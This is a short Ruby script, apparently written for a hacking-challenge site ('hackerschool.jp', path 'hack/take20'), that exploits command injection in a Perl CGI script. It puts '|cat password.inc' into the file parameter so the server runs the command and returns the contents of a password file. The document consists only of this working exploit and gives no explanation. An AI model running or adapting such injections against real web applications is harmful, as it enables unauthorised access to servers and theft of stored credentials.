#!/usr/bin/ruby
require 'net/http'
puts Net::HTTP.get('www.hackerschool.jp','/hack/take20/index.pl?file=|cat%20password.inc')